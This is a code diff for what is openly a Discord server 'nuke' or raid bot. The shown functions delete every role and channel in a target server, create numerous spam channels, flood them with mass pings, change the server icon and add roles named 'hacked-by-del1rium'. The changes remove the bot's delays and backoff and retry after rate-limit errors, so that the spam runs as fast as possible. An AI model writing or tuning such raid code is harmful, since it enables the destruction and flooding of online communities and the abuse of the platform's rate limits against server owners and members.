@@ -165,9 +165,7 @@ async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, 
     
     print(f"INITIATING RAID {raid_type} IN: {guild.name}")
     
-    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
-    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
-    
+    # Fast destruction of existing structure
     destruction_tasks = [
         *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
         *(channel.delete() for channel in guild.channels)
@@ -177,6 +175,10 @@ async def execute_nuke(ctx, channel_name, spam_text, num_channels, total_pings, 
         destruction_tasks.append(execute_premium_actions(guild))
         
     await asyncio.gather(*destruction_tasks, return_exceptions=True)
+    
+    # Optimized spam logic
+    pings_per_channel = total_pings // num_channels if num_channels > 0 else 0
+    remaining_pings = total_pings % num_channels if num_channels > 0 else 0
     
     spam_tasks = []
     for i in range(num_channels):
@@ -230,28 +232,31 @@ async def send_log_embed(ctx, raid_type, member_count, channels, total_pings):
 async def create_and_spam(guild, channel_name, spam_text, index, num_pings):
     try:
         channel = await guild.create_text_channel(f'{channel_name}-{index+1}')
-        await spam_pings(channel, spam_text, num_pings)
+        # Launch spam without waiting for each message to finish (Fire and forget with internal control)
+        asyncio.create_task(spam_pings(channel, spam_text, num_pings))
     except Exception: pass
 
 async def spam_pings(channel, spam_text, amount):
-    sent_count = 0
-    consecutive_fails = 0
-    
-    while sent_count < amount:
+    """
+    Ultra-fast adaptive spam logic.
+    If no rate limit is hit, it sends messages as fast as possible.
+    If a rate limit is hit, it waits the required time.
+    """
+    for _ in range(amount):
         try:
             await channel.send(spam_text)
-            sent_count += 1
-            consecutive_fails = 0
-            await asyncio.sleep(0.1)
-        except discord.Forbidden:
-            break
-        except Exception:
-            consecutive_fails += 1
-            if consecutive_fails >= 5:
-                await asyncio.sleep(2.0)
-                consecutive_fails = 0
-            if consecutive_fails > 20:
+            # No artificial sleep here to maximize speed when no rate limit is present
+        except discord.HTTPException as e:
+            if e.status == 429: # Rate limit hit
+                retry_after = e.retry_after if hasattr(e, 'retry_after') else 1.0
+                await asyncio.sleep(retry_after)
+                # Try to send the message again after waiting
+                try: await channel.send(spam_text)
+                except: pass
+            else:
                 break
+        except Exception:
+            break
 
 async def execute_premium_actions(guild):
     tasks = [change_server_icon(guild), create_chaotic_roles(guild)]
@@ -264,6 +269,7 @@ async def change_server_icon(guild):
     except Exception: pass
 
 async def create_chaotic_roles(guild):
+    # Faster role creation using gather
     tasks = [
         guild.create_role(
             name=f"hacked-by-del1rium-{i}", 
